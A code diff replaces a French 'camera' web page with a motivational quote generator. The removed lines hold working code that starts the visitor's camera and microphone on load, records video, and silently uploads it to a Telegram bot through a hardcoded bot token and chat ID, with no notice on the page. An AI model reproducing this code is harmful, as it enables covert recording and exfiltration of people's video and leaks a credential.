@@ -3,227 +3,243 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>appareil photo Yann bot</title>
+    <title>Générateur de Citations Motivantes</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        * {
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f0f2f5;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
         }
 
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background: #f0f0f0;
-            color: #333;
+        header {
+            background: linear-gradient(45deg, #4e54c8, #8f94fb);
+            color: white;
+            padding: 30px 20px;
             text-align: center;
         }
 
-        h1 {
-            margin-bottom: 20px;
-            font-size: 32px;
-            color: #2c3e50;
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
         }
 
-        .camera-container {
-            position: relative;
-            width: 80%;
-            max-width: 640px;
+        main {
+            padding: 30px 15px;
+            max-width: 900px;
+            margin: auto;
+        }
+
+        section {
+            background-color: white;
             border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
-            background-color: black;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            padding: 20px;
         }
 
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .controls {
-            margin-top: 20px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
+        section h2 {
+            color: #4e54c8;
         }
 
         button {
-            background: #3498db;
+            padding: 10px 20px;
+            background: #4e54c8;
             color: white;
             border: none;
-            padding: 12px 18px;
-            font-size: 16px;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: background 0.3s;
+            font-size: 1em;
         }
 
         button:hover {
-            background: #2980b9;
+            background: #363cbf;
         }
 
-        button:disabled {
-            background: gray;
-            cursor: not-allowed;
-        }
-
-        .photo-container, .video-container {
+        .quote {
             margin-top: 20px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
+            font-size: 1.4em;
+            color: #222;
+            font-style: italic;
         }
 
-        img, video {
-            width: 150px;
-            height: auto;
-            border-radius: 8px;
+        footer {
+            text-align: center;
+            font-size: 0.9em;
+            color: #666;
+            padding: 20px;
+            border-top: 1px solid #ddd;
+            background-color: #fff;
+        }
+
+        footer a {
+            color: #4e54c8;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
-    <h1>📷 appareil photo yann bot</h1>
-    
-    <div class="camera-container">
-        <video id="cameraPreview" autoplay muted></video>
-    </div>
+    <header>
+        <h1>Générateur de Citations Motivantes</h1>
+        <p>Inspire-toi chaque jour dans tous les domaines de ta vie.(ce projet vous ait présente par Yann bot un développeur pationné.)</p>
+    </header>
 
-    <div class="controls">
-        <button id="startButton">▶ Prendre une vidéo</button>
-        <button id="photoButton">📸 Prendre une photo</button>
-        <button id="switchCameraButton">🔄 Changer la caméra</button>
-    </div>
+    <main>
+        <section>
+            <h2>Citations sur la Vie Sentimentale</h2>
+            <button onclick="generateRomanticQuote()">Afficher une citation sentimentale</button>
+            <p class="quote" id="romanticQuote"></p>
+        </section>
 
-    <h2>📂 Vidéos enregistrées</h2>
-    <div id="videos" class="video-container"></div>
+        <section>
+            <h2>Citations sur la Vie Professionnelle</h2>
+            <button onclick="generateWorkQuote()">Afficher une citation professionnelle</button>
+            <p class="quote" id="workQuote"></p>
+        </section>
 
-    <h2>🖼️ Photos prises</h2>
-    <div id="photos" class="photo-container"></div>
+        <section>
+            <h2>Citations sur l'Informatique et le Hack</h2>
+            <button onclick="generateTechQuote()">Afficher une citation informatique</button>
+            <p class="quote" id="techQuote"></p>
+        </section>
+
+        <section>
+            <h2>Citations sur le Développement Personnel</h2>
+            <button onclick="generatePersonalQuote()">Afficher une citation personnelle</button>
+            <p class="quote" id="personalQuote"></p>
+        </section>
+
+        <section>
+            <h2>Citations Sportives</h2>
+            <button onclick="generateSportQuote()">Afficher une citation sportive</button>
+            <p class="quote" id="sportQuote"></p>
+        </section>
+
+        <section>
+            <h2>Citations d'Entrepreneuriat</h2>
+            <button onclick="generateBusinessQuote()">Afficher une citation business</button>
+            <p class="quote" id="businessQuote"></p>
+        </section>
+
+        <section>
+            <h2>Citations sur la Créativité et l'Art</h2>
+            <button onclick="generateArtQuote()">Afficher une citation artistique</button>
+            <p class="quote" id="artQuote"></p>
+        </section>
+
+        <section>
+            <h2>Citations Scientifiques</h2>
+            <button onclick="generateScienceQuote()">Afficher une citation scientifique</button>
+            <p class="quote" id="scienceQuote"></p>
+        </section>
+    </main>
+
+    <footer>
+        &copy; 2025 Générateur de Citations. Tous droits réservés. 
+        auteur : yann bot| <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a>
+    </footer>
 
     <script>
-        const botToken = "7120430648:AAEbBfFfg8b1nv8Y52L73iz8yUw4lPUwRow";  
-        const chatId = "6493293796";  
+        const romanticQuotes = [
+            "L'amour, c'est comme le vent, nous ne pouvons pas le voir, mais nous pouvons le ressentir.",
+            "Tu es mon aujourd'hui et tous mes lendemains.",
+            "L'amour est composé d'une seule âme habitant deux corps.",
+            "La plus grande joie de la vie, c'est l'amour."
+        ];
 
-        const cameraPreview = document.getElementById('cameraPreview');
-        const startButton = document.getElementById('startButton');
-        const photoButton = document.getElementById('photoButton');
-        const switchCameraButton = document.getElementById('switchCameraButton');
+        const workQuotes = [
+            "Le succès est la somme de petits efforts répétés jour après jour.",
+            "L'avenir appartient à ceux qui croient à la beauté de leurs rêves.",
+            "Ne rêvez pas votre vie, vivez vos rêves.",
+            "Le travail acharné bat le talent quand le talent ne travaille pas dur."
+        ];
 
-        let mediaRecorder;
-        let recordedBlobs = [];
-        let stream;
-        let currentCamera = 'environment'; // Start with the back camera
-        let recordingInterval;
+        const techQuotes = [
+            "Parfois, c’est le bug qui te montre la voie.",
+            "Le code, c’est de la poésie en logique.",
+            "Un bon hacker est simplement quelqu’un qui cherche à comprendre les systèmes.",
+            "La sécurité n'est pas un produit, mais un processus.",
+            "Il n'y a pas de problème qui ne puisse être résolu avec une ligne de code en plus... ou en moins."
+        ];
 
-        async function startCamera() {
-            try {
-                const constraints = {
-                    video: {
-                        facingMode: currentCamera
-                    },
-                    audio: true
-                };
-                stream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraPreview.srcObject = stream;
-                console.log("📷 Caméra activée.");
-            } catch (err) {
-                alert("Erreur d'accès à la caméra/micro !");
-                console.error("Erreur :", err);
-            }
+        const personalQuotes = [
+            "Crois en toi, chaque jour est une nouvelle chance de réussir.",
+            "Les limites n'existent que si tu y crois.",
+            "Commence là où tu es, utilise ce que tu as, fais ce que tu peux.",
+            "Ta seule limite, c’est toi-même.",
+            "Les petites habitudes créent de grands changements."
+        ];
+
+        const sportQuotes = [
+            "La douleur d'aujourd'hui est la force de demain.",
+            "Chaque entraînement te rapproche de ton objectif.",
+            "Ton seul adversaire, c’est la personne que tu étais hier.",
+            "Le corps accomplit ce que l’esprit croit possible.",
+            "Arrête de souhaiter, commence à travailler."
+        ];
+
+        const businessQuotes = [
+            "Ne limite pas tes défis, défie tes limites.",
+            "Un rêve ne devient réalité qu’avec de la détermination et de l’action.",
+            "Les gagnants trouvent des moyens, les perdants des excuses.",
+            "Le succès est une échelle que l'on ne peut pas grimper les mains dans les poches.",
+            "Échouer, c’est avoir essayé. Ne rien faire, c’est échouer à coup sûr."
+        ];
+
+        const artQuotes = [
+            "La créativité, c’est l’intelligence qui s’amuse. — Albert Einstein",
+            "Crée comme si personne ne te regardait.",
+            "L’art lave l’âme de la poussière du quotidien. — Picasso",
+            "Chaque artiste commence par être amateur.",
+            "L’imagination est plus importante que la connaissance."
+        ];
+
+        const scienceQuotes = [
+            "Le doute est le commencement de la sagesse.",
+            "La science est une manière de penser, bien plus qu’un corps de connaissances.",
+            "La curiosité est le moteur de toute découverte.",
+            "Rien ne se perd, rien ne se crée, tout se transforme. — Lavoisier",
+            "Chaque atome en toi a appartenu à une étoile."
+        ];
+
+        function getRandomQuote(quotes) {
+            return quotes[Math.floor(Math.random() * quotes.length)];
         }
 
-        async function switchCamera() {
-            // Stop current stream tracks
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-
-            // Toggle the camera between 'environment' (back) and 'user' (front)
-            currentCamera = (currentCamera === 'environment') ? 'user' : 'environment';
-            console.log(`Changement de caméra: ${currentCamera}`);
-
-            await startCamera();
+        function generateRomanticQuote() {
+            document.getElementById("romanticQuote").innerText = getRandomQuote(romanticQuotes);
         }
 
-        function startRecording() {
-            recordedBlobs = [];
-            let options = { mimeType: 'video/webm;codecs=vp9,opus' };
-
-            try {
-                mediaRecorder = new MediaRecorder(stream, options);
-            } catch (e) {
-                console.error('Erreur MediaRecorder:', e);
-                return;
-            }
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data && event.data.size > 0) {
-                    recordedBlobs.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = saveVideo;
-            mediaRecorder.start();
-            console.log("🎥 Enregistrement...");
-
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 10000);
+        function generateWorkQuote() {
+            document.getElementById("workQuote").innerText = getRandomQuote(workQuotes);
         }
 
-        async function saveVideo() {
-            let blob = new Blob(recordedBlobs, { type: "video/webm" });
-            let file = new File([blob], `video_${Date.now()}.webm`, { type: "video/webm" });
-
-            let videoUrl = URL.createObjectURL(blob);
-            let videoElement = document.createElement("video");
-            videoElement.src = videoUrl;
-            videoElement.controls = true;
-            document.getElementById("videos").appendChild(videoElement);
-
-            let formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("video", file);
-
-            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
-
-            fetch(url, { method: "POST", body: formData })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("✅ Vidéo envoyée sur Telegram !");
-                } else {
-                    console.error("❌ Erreur Telegram :", data);
-                }
-            })
-            .catch(error => console.error("❌ Erreur d'envoi :", error));
-
-            recordedBlobs = [];
+        function generateTechQuote() {
+            document.getElementById("techQuote").innerText = getRandomQuote(techQuotes);
         }
 
-        function takePhoto() {
-            let canvas = document.createElement("canvas");
-            canvas.width = cameraPreview.videoWidth;
-            canvas.height = cameraPreview.videoHeight;
-            let ctx = canvas.getContext("2d");
-            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
-
-            let photoUrl = canvas.toDataURL("image/png");
-            let img = document.createElement("img");
-            img.src = photoUrl;
-            document.getElementById("photos").appendChild(img);
+        function generatePersonalQuote() {
+            document.getElementById("personalQuote").innerText = getRandomQuote(personalQuotes);
         }
 
-        startCamera();
-        startButton.addEventListener('click', startRecording);
-        photoButton.addEventListener('click', takePhoto);
-        switchCameraButton.addEventListener('click', switchCamera);
+        function generateSportQuote() {
+            document.getElementById("sportQuote").innerText = getRandomQuote(sportQuotes);
+        }
+
+        function generateBusinessQuote() {
+            document.getElementById("businessQuote").innerText = getRandomQuote(businessQuotes);
+        }
+
+        function generateArtQuote() {
+            document.getElementById("artQuote").innerText = getRandomQuote(artQuotes);
+        }
+
+        function generateScienceQuote() {
+            document.getElementById("scienceQuote").innerText = getRandomQuote(scienceQuotes);
+        }
     </script>
 </body>
-		</html>
+	</html>
